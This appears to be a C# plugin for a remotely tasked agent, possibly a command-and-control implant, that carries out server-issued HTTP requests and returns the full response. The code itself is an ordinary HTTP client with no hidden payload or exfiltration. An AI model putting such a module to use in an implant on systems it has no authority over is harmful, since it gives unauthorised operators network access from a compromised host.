using System.Net;
using System.Text;
using System.Text.Json;
using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "http-request";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            try
            {
                var args = JsonSerializer.Deserialize<http_request.HttpRequestArgs>(
                    job.task.parameters) ?? new http_request.HttpRequestArgs();

                if (string.IsNullOrEmpty(args.url))
                {
                    messageManager.Write(
                        "A URL needs to be specified.",
                        job.task.id, true, "error");
                    return;
                }

                var handler = new HttpClientHandler();
                if (!args.follow_redirects)
                {
                    handler.AllowAutoRedirect = false;
                }
                handler.AutomaticDecompression =
                    DecompressionMethods.GZip | DecompressionMethods.Deflate;

                if (!string.IsNullOrEmpty(args.cookies) &&
                    args.cookies.StartsWith('{'))
                {
                    var cookies = JsonSerializer
                        .Deserialize<Dictionary<string, string>>(args.cookies);
                    if (cookies != null)
                    {
                        var container = new CookieContainer();
                        var uri = new Uri(args.url);
                        foreach (var kvp in cookies)
                        {
                            container.Add(uri, new Cookie(kvp.Key, kvp.Value));
                        }
                        handler.CookieContainer = container;
                    }
                }

                using var client = new HttpClient(handler);
                client.Timeout = TimeSpan.FromSeconds(args.timeout);

                var request = new HttpRequestMessage(
                    ParseMethod(args.method), args.url);

                if (!string.IsNullOrEmpty(args.headers) &&
                    args.headers.StartsWith('{'))
                {
                    var headers = JsonSerializer
                        .Deserialize<Dictionary<string, string>>(args.headers);
                    if (headers != null)
                    {
                        foreach (var kvp in headers)
                        {
                            request.Headers.TryAddWithoutValidation(
                                kvp.Key, kvp.Value);
                        }
                    }
                }

                if (!string.IsNullOrEmpty(args.body))
                {
                    request.Content = new StringContent(
                        args.body, Encoding.UTF8, "application/json");
                }

                DebugLog.Log(
                    $"{Name} {args.method} {args.url} [{job.task.id}]");

                var response = await client.SendAsync(request);
                var content = await response.Content.ReadAsStringAsync();

                var sb = new StringBuilder();
                sb.AppendLine($"HTTP/{response.Version} {(int)response.StatusCode} {response.ReasonPhrase}");
                foreach (var header in response.Headers)
                {
                    sb.AppendLine(
                        $"{header.Key}: {string.Join(", ", header.Value)}");
                }
                foreach (var header in response.Content.Headers)
                {
                    sb.AppendLine(
                        $"{header.Key}: {string.Join(", ", header.Value)}");
                }
                sb.AppendLine();
                sb.Append(content);

                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = sb.ToString(),
                    task_id = job.task.id
                });
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error: {e.Message} [{job.task.id}]");
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }

        private static HttpMethod ParseMethod(string method)
        {
            return method.ToUpperInvariant() switch
            {
                "GET" => HttpMethod.Get,
                "POST" => HttpMethod.Post,
                "PUT" => HttpMethod.Put,
                "DELETE" => HttpMethod.Delete,
                "PATCH" => HttpMethod.Patch,
                "HEAD" => HttpMethod.Head,
                "OPTIONS" => HttpMethod.Options,
                _ => HttpMethod.Get,
            };
        }
    }
}
